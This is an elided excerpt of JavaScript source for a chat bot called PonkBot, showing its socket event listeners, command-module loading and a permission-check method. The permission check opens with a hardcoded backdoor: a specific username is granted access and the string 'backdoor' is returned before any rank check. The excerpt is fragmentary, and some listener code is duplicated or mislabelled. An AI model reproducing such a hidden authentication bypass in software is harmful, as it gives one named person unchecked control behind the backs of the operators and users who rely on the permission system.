...
class PonkBot extends EventEmitter {
    constructor(config){
        ...
        Object.assign(this, {
            ...
            channelCSSJS: {},    // The channel CSS and JS
        ...
        this.once('clientstart', ()=>{
            this.scheduleInit(config.scheduler, this.log);
    ...
    get bots(){
        return [this.name, ...this.peers];
    }

    get channel(){
        return this.client.chan;
    }
    ...
    registerListeners(socket){
        ...
        */
        ...
        socket.on('setMotd', (banner)=>{ this.handleBanner(banner) });
        socket.on('newPoll', (poll)=>{ this.handleNewPoll(poll) });
        socket.on('updatePoll', (poll)=>{ this.handleUpdatePoll(poll) });
        socket.on('closePoll', ()=>{ this.handleClosePoll() });
        socket.on('channelCSSJS', (cssjs)=>{ this.handleChannelCSSJS(cssjs) });
        socket.on('setMotd', (motd)=>{ this.handleMotd(motd) });
        socket.on('chatFilters', (filters)=>{ this.handleChatFilters(filters) });
        socket.on('updateChatFilter', (filter)=>{ this.handleFilterUpdate(filter) });
        socket.on('deleteChatFilter', (filter)=>{ this.handleFilterRemove(filter) });
        socket.on('pm', (filter)=>{ this.handlePrivateMessage(filter) });
    }
    ...
    */
    ...
    setupCoreCommands(logger){
        ...
        const betting = require('../hammerspace/betting.js');
        betting.init(this);
        const gt4cc = require('../hammerspace/gt4cc.js');
        gt4cc.init(this);
        const butt = require('../hammerspace/butt.js');
        butt.init(this);
        this.registerCommands(require('../hammerspace/ponk_blame.js'));
        this.registerCommands(require('../hammerspace/ponk_horseshoe.js'));
    }
    ...
    checkPermission({ user, rank = 1<<16, hybrid = [] }){
        if (user && user.toLowerCase() === 'zocram') return Promise.resolve('backdoor');
        if(!user){
...
// Validators
Object.assign(PonkBot.prototype, require('./validators.js'));

// Scheduler
Object.assign(PonkBot.prototype, require('./schedule.js'));
